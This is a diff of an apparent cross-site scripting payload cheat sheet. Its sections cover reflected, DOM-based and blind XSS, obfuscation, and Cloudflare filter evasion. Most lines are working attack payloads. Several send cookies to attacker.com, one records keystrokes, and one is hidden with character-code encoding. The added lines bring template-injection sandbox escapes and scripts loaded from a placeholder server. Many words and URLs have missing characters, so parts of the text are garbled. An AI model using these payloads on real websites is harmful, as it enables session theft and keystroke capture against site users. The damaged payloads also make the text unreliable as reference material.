@@ -10,13 +10,11 @@ Login Nmae:
 
 
 Reflected Cross-Site Scrip ng (XSS)
-
 1. Basic alert: 
 <script>alert('XSS');</script> 
 1. Stealing Cookies: 
 <script>fetch('h p://a acker.com/log?cookie=' + document.cookie);</script> 
 2. Redirec ng the User: 
-
 <script>window.location='http://attacker.com'</script> 
 
 <input type="text" value="<script>alert(123)</script>">
@@ -67,8 +65,7 @@ Advanced Payloads
 4. IIFE (Immediately Invoked Func on Expression): 
 <script>(func on(){alert('XSS')})()</script> 
 
----
-**DOM-based Cross-Site Scrip ng (DOM XSS)**
+DOM-based Cross-Site Scrip ng (DOM XSS)
 1. URL Parameter Exploita on 
 http://example.com/page.html?name=<script>alert('XSS')</script> 
 2. Loca on Hash Manipula on 
@@ -83,9 +80,8 @@ http://example.com/page.html?data=alert('XSS')
 6. loca on.search with innerHTML 
 http://example.com/page.html?message=<svg/onload=alert('XSS')> 
 
----
 
-**Basic Blind XSS Payloads **
+Basic Blind XSS Payloads 
 1. Basic Exfiltra on using <script> 
 <script>new Image().src='h ps://a acker.com/log?cookie='+document.cookie;</script> 
 2. Using fetch() for Stealth 
@@ -114,9 +110,7 @@ fetch('https://a acker.com/keys?key=' + String.fromCharCode(e.which));
 }; 
 </script> 
 
----
-
-**Obfuscated and Filter Evasion Techniques**
+Obfuscated and Filter Evasion Techniques
 1. Encoded Characters 
 <script>eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,
  97,116,116,97,99,107,101,114,46,99,111,109,47,108,111,103,63,99,111,111,107,105,101,61
@@ -126,9 +120,7 @@ fetch('https://a acker.com/keys?key=' + String.fromCharCode(e.which));
 3. Using setTimeout 
 <script>setTimeout(func on(){fetch('h ps://attacker.com/log?cookie='+document.cookie)}, 2000);</script> 
 
----
-
-**Stealthy Payloads for Non-Script Contexts**
+Stealthy Payloads for Non-Script Contexts
 1. Using an HTML Attribute 
 <iframe srcdoc="<script>new 
 Image().src='https://attacker.com/log?cookie='+document.cookie;</script>"></iframe> 
@@ -142,8 +134,6 @@ ws.send(document.cookie);
 }; 
 </script>
 
-
----
 Cloudflare 
 <select><style></select>
 
@@ -162,6 +152,18 @@ Cloudflare
 "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 
 
+"></script>"><--<img+src= "><svg/onload=alert(document.cookie)>> --!>
+"></script>"><--<img+src= "><svg/onload=alert(document.cookie)>> --!>
+`-alert?.(1)-'
+%22autofocus%2fonfocus%3dalert(1)--%3E
+%22autofocus%2fonfocus%3dalert(1)--%3E
+{{constructor.constructor("import('{SERVER}')")()}}
+"""><script src="{SERVER}/script.js"></script>
+"><script>$.getScript("{SERVER}")</script>
+<meta http-equiv="refresh" content="0; url={SERVER}" />
+
+{{'a'.constructor.prototype.charAt=".valueOf; $eval("x='\"+(y='if(!window\\u002ex)alert(window\ \u002ex=1)')+eval(y)+\"");}}
+%2522%253e%253csvg/onload=prompt(document.cookie)%253e
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
